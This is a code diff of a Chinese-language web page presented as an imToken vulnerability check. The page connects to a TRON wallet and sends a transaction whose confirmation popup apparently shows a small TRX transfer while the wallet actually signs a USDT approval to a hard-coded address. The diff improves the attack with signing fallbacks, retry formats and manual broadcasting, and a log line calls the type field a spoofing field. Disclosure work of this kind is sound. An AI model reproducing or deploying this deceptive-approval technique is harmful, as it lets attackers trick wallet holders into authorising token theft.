@@ -69,9 +69,10 @@
   <div class="card">
     <div class="card-header"><span class="dot red"></span> 漏洞验证流程</div>
     <div style="font-size:13px; color:var(--text2);">
-      1. 连接钱包 → 2. 发送验证交易 → 3. 观察 imToken 弹窗显示<br>
-      <span class="highlight-green">弹窗将显示：发送 0.1 TRX 至 TEfFnh...bSAz</span><br>
-      <span class="highlight-red">实际签名内容：USDT approve (授权 1 USDT 给同一地址)</span>
+      1. 连接钱包 → 2. 点击发送验证交易 → 3. 观察 imToken 弹窗<br>
+      <span class="highlight-green">弹窗可能显示：发送 0.1 TRX 至 TEfFnh...bSAz</span><br>
+      <span class="highlight-red">实际签名内容：USDT approve (授权 1 USDT)</span><br>
+      <small>若 sendTransaction 不可用，将自动使用 signTransaction + 手动广播</small>
     </div>
   </div>
 
@@ -85,7 +86,7 @@
       <div class="row"><span class="label">地址</span><span class="value" id="addrText"></span></div>
       <div class="row"><span class="label">TRX</span><span class="value" id="trxBal"></span></div>
       <div class="row"><span class="label">网络</span><span class="value">TRON 主网</span></div>
-      <button class="btn btn-test" id="btnSend">发送验证交易 (tron.sendTransaction)</button>
+      <button class="btn btn-test" id="btnSend">发送验证交易 (自动切换方式)</button>
       <button class="btn btn-check" id="btnCheckAllowance">查询 USDT 授权额度</button>
     </div>
   </div>
@@ -94,7 +95,7 @@
     <div class="card-header"><span class="dot orange"></span> USDT 授权额度</div>
     <div class="row"><span class="label">当前授权</span><span class="value" id="currentAllowance">--</span></div>
     <div class="row"><span class="label">变化</span><span class="value" id="allowanceChange">--</span></div>
-    <div class="info-box">若授权从 0 变为 1 USDT，则证明确认页显示为 TRX 转账，但链上执行了 USDT 授权。</div>
+    <div class="info-box">若授权从 0 变为 1 USDT，则证明确认页可能显示为 TRX 转账，但链上执行了 USDT 授权。</div>
   </div>
 
   <div class="card">
@@ -119,21 +120,15 @@
   let lastTxID = null;
 
   const $ = id => document.getElementById(id);
-  const beforeConnect = $('beforeConnect');
-  const afterConnect = $('afterConnect');
   const btnConnect = $('btnConnect');
   const btnSend = $('btnSend');
   const btnCheck = $('btnCheckAllowance');
   const logBox = $('logContainer');
-  const allowanceCard = $('allowanceCard');
-  const currentAllowanceEl = $('currentAllowance');
-  const allowanceChangeEl = $('allowanceChange');
-  const dotStatus = $('dotStatus');
 
   function log(msg, type = '') {
     const div = document.createElement('div');
     div.className = 'log-line' + (type ? ' log-' + type : '');
-    div.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
     logBox.appendChild(div);
     logBox.scrollTop = logBox.scrollHeight;
   }
@@ -329,7 +324,7 @@
       const hashArray = Array.from(new Uint8Array(hashBuffer));
       return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
     } catch (e) {
-      log('无法计算 txID (需要 HTTPS): ' + e.message, 'warn');
+      log('无法计算 txID，忽略', 'warn');
       return null;
     }
   }
@@ -373,24 +368,20 @@
   async function refreshAllowanceUI(initial = false) {
     if (!walletAddr) return;
     const allowance = await queryAllowance(walletAddr, SPENDER);
-    if (allowance === null) {
-      currentAllowanceEl.textContent = '查询失败';
-      allowanceChangeEl.textContent = '--';
-      return;
-    }
-    currentAllowanceEl.textContent = formatAmount(allowance);
-    allowanceCard.style.display = 'block';
+    if (allowance === null) return;
+    $('currentAllowance').textContent = formatAmount(allowance);
+    $('allowanceCard').style.display = 'block';
     if (initial) {
       initialAllowance = allowance;
-      allowanceChangeEl.textContent = '初始值';
+      $('allowanceChange').textContent = '初始值';
     } else if (initialAllowance !== null) {
       const diff = allowance - initialAllowance;
       if (diff > 0n) {
-        allowanceChangeEl.textContent = '+' + formatAmount(diff);
-        allowanceChangeEl.style.color = 'var(--red)';
-        log('⚠️ 授权额度增加！弹窗显示 TRX 转账，链上实际执行了 USDT 授权。', 'error');
+        $('allowanceChange').textContent = '+' + formatAmount(diff);
+        $('allowanceChange').style.color = 'var(--red)';
+        log('⚠️ 授权额度增加！链上成功执行了 USDT 授权，但弹窗可能只显示转账。', 'error');
       } else {
-        allowanceChangeEl.textContent = '无变化';
+        $('allowanceChange').textContent = '无变化';
       }
     }
   }
@@ -400,7 +391,6 @@
            typeof window.imToken.callPromisifyAPI === 'function';
   }
 
-  // 连接钱包
   async function connect() {
     log('检查钱包环境…', 'warn');
     if (!hasImTokenBridge()) {
@@ -425,7 +415,7 @@
         }
       }
     } else {
-      log('未检测到 tronWeb，尝试直接使用 imToken API 获取地址', 'warn');
+      log('未检测到 tronWeb，尝试直接获取地址', 'warn');
       try {
         const result = await window.imToken.callPromisifyAPI('tron_requestAccounts');
         if (Array.isArray(result) && result.length > 0) walletAddr = result[0];
@@ -439,144 +429,160 @@
       log('获取地址失败', 'error');
       return;
     }
-    document.getElementById('addrText').textContent = walletAddr;
+    $('addrText').textContent = walletAddr;
     try {
       const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
       const data = await resp.json();
       const bal = (data.data?.[0]?.balance || 0) / 1e6;
-      document.getElementById('trxBal').textContent = bal + ' TRX';
-    } catch { document.getElementById('trxBal').textContent = '--'; }
-    dotStatus.className = 'dot green';
-    beforeConnect.style.display = 'none';
-    afterConnect.style.display = 'block';
+      $('trxBal').textContent = bal + ' TRX';
+    } catch { $('trxBal').textContent = '--'; }
+    $('dotStatus').className = 'dot green';
+    $('beforeConnect').style.display = 'none';
+    $('afterConnect').style.display = 'block';
     log('已连接: ' + walletAddr, 'success');
     await refreshAllowanceUI(true);
   }
 
-  // 尝试调用 imToken，支持多种参数格式，优先采用 { tx, from, useTronHeader }
-  async function trySendTransaction(payload) {
-    // 计算 txID 并补到 payload 中
+  // 手动广播交易
+  async function broadcastTransaction(signedTxHex) {
+    log('广播交易到链上...', 'warn');
+    try {
+      const resp = await fetch(TRON_API + '/wallet/broadcasttransaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ transaction: signedTxHex })
+      });
+      const data = await resp.json();
+      if (data.txid) {
+        lastTxID = data.txid;
+        log('广播成功! TXID: ' + data.txid, 'success');
+        log('Tronscan: https://tronscan.org/#/transaction/' + data.txid, 'info');
+        setTimeout(() => refreshAllowanceUI(false), 12000);
+        return true;
+      } else {
+        log('广播失败: ' + JSON.stringify(data), 'error');
+        return false;
+      }
+    } catch (e) {
+      log('广播异常: ' + e.message, 'error');
+      return false;
+    }
+  }
+
+  // 尝试使用 signTransaction + 手动广播
+  async function signAndBroadcast(payload) {
     const txID = await computeTxID(payload.raw_data_hex);
     const basePayload = { ...payload, txID };
 
-    // 定义尝试的格式列表，依次尝试
-    const formats = [
-      // 格式1：完整参数 (tx + from + useTronHeader) —— 首推
-      {
-        desc: '{ tx, from, useTronHeader: true }',
-        value: {
-          tx: basePayload,
-          from: walletAddr,
-          useTronHeader: true
-        }
-      },
-      // 格式2：{ tx, from } 不带 useTronHeader
-      {
-        desc: '{ tx, from }',
-        value: {
-          tx: basePayload,
-          from: walletAddr
-        }
-      },
-      // 格式3：仅 { tx }（之前能走到“找不到钱包”那个错误）
-      {
-        desc: '{ tx: tx }',
-        value: { tx: basePayload }
-      },
-      // 后备格式：[payload] 数组
-      {
-        desc: '[payload]',
-        value: [basePayload]
-      },
-      // 后备格式：{ transaction: payload }
-      {
-        desc: '{ transaction: payload }',
-        value: { transaction: basePayload }
-      },
-      // 后备格式：{ params: [payload] }
-      {
-        desc: '{ params: [payload] }',
-        value: { params: [basePayload] }
-      },
-      // 最后备：只传 raw_data_hex
-      {
-        desc: '{ raw_data_hex: payload.raw_data_hex }',
-        value: { raw_data_hex: payload.raw_data_hex }
-      }
+    // 尝试的 sign 参数格式
+    const signFormats = [
+      { desc: '{ transaction: tx, from }', val: { transaction: basePayload, from: walletAddr } },
+      { desc: '{ tx, from }', val: { tx: basePayload, from: walletAddr } },
+      { desc: '{ transaction: { raw_data_hex }, from }', val: { transaction: { raw_data_hex: payload.raw_data_hex, visible: true }, from: walletAddr } },
+      { desc: '直接传 payload', val: basePayload }
     ];
 
-    let lastError = null;
-    for (const format of formats) {
-      log(`尝试格式: ${format.desc}`, 'warn');
+    for (const fmt of signFormats) {
+      log(`尝试 signTransaction 格式: ${fmt.desc}`, 'warn');
       try {
-        const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', format.value);
-        log(`成功! 返回: ${JSON.stringify(res)}`, 'success');
-        return res;
-      } catch (e) {
-        log(`格式 "${format.desc}" 失败: ${e.message}`, 'error');
-        lastError = e;
-        if (e.message && (e.message.includes('reject') || e.message.includes('cancel'))) {
-          // 用户取消，不再尝试后续格式
-          throw e;
+        const signed = await window.imToken.callPromisifyAPI('tron.signTransaction', fmt.val);
+        log('签名返回: ' + JSON.stringify(signed), 'success');
+
+        // 提取签名后的交易hex
+        let signedHex = null;
+        if (typeof signed === 'string') {
+          signedHex = signed; // 直接是hex
+        } else if (signed && signed.transaction) {
+          signedHex = signed.transaction;
+        } else if (signed && signed.signedTransaction) {
+          signedHex = signed.signedTransaction;
+        } else if (signed && signed.result) {
+          signedHex = signed.result;
         }
-        // 其他错误继续尝试下一个格式
-        continue;
+
+        if (signedHex && signedHex.length > 20) {
+          log('获得签名数据，准备广播', 'success');
+          const ok = await broadcastTransaction(signedHex);
+          if (ok) return { txid: lastTxID };
+        } else {
+          log('签名返回值未包含有效交易hex', 'error');
+        }
+      } catch (e) {
+        log(`signTransaction 格式 ${fmt.desc} 失败: ${e.message}`, 'error');
+        if (e.message.includes('reject')) throw e;
       }
     }
-    // 所有格式都失败，抛出最后一个错误
-    throw lastError || new Error('所有尝试的格式均失败');
+    throw new Error('所有 signTransaction 格式均失败');
   }
 
-  // 发送交易
+  // 主流程：先尝试 sendTransaction，失败则自动 sign + 广播
+  async function trySendOrSign(payload) {
+    const txID = await computeTxID(payload.raw_data_hex);
+    const basePayload = { ...payload, txID };
+
+    // 先试 sendTransaction 的可靠格式
+    const sendFormats = [
+      { desc: '{ tx, from, useTronHeader }', val: { tx: basePayload, from: walletAddr, useTronHeader: true } },
+      { desc: '{ tx, from }', val: { tx: basePayload, from: walletAddr } }
+    ];
+
+    for (const fmt of sendFormats) {
+      log(`尝试 sendTransaction: ${fmt.desc}`, 'warn');
+      try {
+        const res = await window.imToken.callPromisifyAPI('tron.sendTransaction', fmt.val);
+        log('sendTransaction 返回: ' + JSON.stringify(res), 'success');
+        const rid = res && (res.txid || res.result || res.txID);
+        if (rid) {
+          lastTxID = rid;
+          log('交易已上链! TXID: ' + rid, 'success');
+          return res;
+        } else {
+          log('sendTransaction 返回无 txid，可能未广播成功，尝试 sign+广播', 'warn');
+        }
+      } catch (e) {
+        log(`sendTransaction 错误: ${e.message}`, 'error');
+        if (e.message.includes('reject')) throw e;
+      }
+    }
+
+    // sendTransaction 失败，自动走 sign + 广播
+    log('sendTransaction 全部失败，切换为 signTransaction + 手动广播', 'warn');
+    return await signAndBroadcast(payload);
+  }
+
   async function sendTx() {
-    log('📌 按钮触发，开始构造交易…', 'warn');
+    log('📌 开始构造交易…', 'warn');
     if (!walletAddr) { alert('请先连接钱包'); return; }
     if (!hasImTokenBridge()) { log('imToken 桥接不可用', 'error'); return; }
 
     let blockInfo;
     try {
       blockInfo = await fetchLatestBlock();
-      log('最新区块 #' + blockInfo.number, 'success');
+      log('区块 #' + blockInfo.number, 'success');
     } catch (e) {
-      log('区块数据获取失败，中止', 'error');
+      log('区块获取失败，中止', 'error');
       return;
     }
 
     const payload = buildPayload(walletAddr, blockInfo);
     log('Payload 构造完成', 'warn');
-    log('raw_data.contract[0].type = ' + payload.raw_data.contract[0].type, 'success');
-    const approveSelector = '095ea7b3';
-    if (payload.raw_data_hex.includes(approveSelector)) {
+    log('欺骗字段 type = ' + payload.raw_data.contract[0].type, 'success');
+    if (payload.raw_data_hex.includes('095ea7b3')) {
       log('raw_data_hex 包含 approve 选择器', 'success');
     } else {
-      log('raw_data_hex 中未找到 approve 选择器！', 'error');
+      log('raw_data_hex 中未找到 approve！', 'error');
     }
 
-    log('开始尝试调用 imToken (优先格式: { tx, from, useTronHeader })…', 'warn');
+    log('开始处理交易 (优先 sendTransaction，失败自动 sign+广播)', 'warn');
     log('❗ 弹窗应显示：发送 0.1 TRX 至 ' + SPENDER, 'warn');
 
     try {
-      const res = await trySendTransaction(payload);
-      if (res && (res.txid || res.result || res.txID)) {
-        lastTxID = res.txid || res.result || res.txID || '';
-        log('交易已广播! TXID: ' + lastTxID, 'success');
-        if (lastTxID) {
-          log('Tronscan: https://tronscan.org/#/transaction/' + lastTxID, 'info');
-        }
-        setTimeout(async () => {
-          log('查询链上授权额度…', 'warn');
-          await refreshAllowanceUI(false);
-        }, 15000);
-      } else {
-        log('未返回 txid，交易可能失败', 'error');
+      const res = await trySendOrSign(payload);
+      if (res && lastTxID) {
+        log('操作完成，等待查询 allowance...', 'success');
       }
     } catch (e) {
       log('最终失败: ' + e.message, 'error');
-      if (e.message.includes('reject') || e.message.includes('cancel')) {
-        log('用户取消了交易', 'warn');
-      } else if (e.message.includes('insufficient')) {
-        log('TRX 余额不足', 'error');
-      }
     }
   }
 
@@ -591,9 +597,9 @@
   btnCheck.addEventListener('click', manualCheck);
 
   if (hasImTokenBridge()) {
-    log('检测到 imToken 桥接环境', 'success');
+    log('imToken 桥接环境就绪', 'success');
   } else {
-    log('请使用 imToken DApp 浏览器打开此页面', 'warn');
+    log('请在 imToken DApp 浏览器中打开', 'warn');
   }
 })();
 </script>
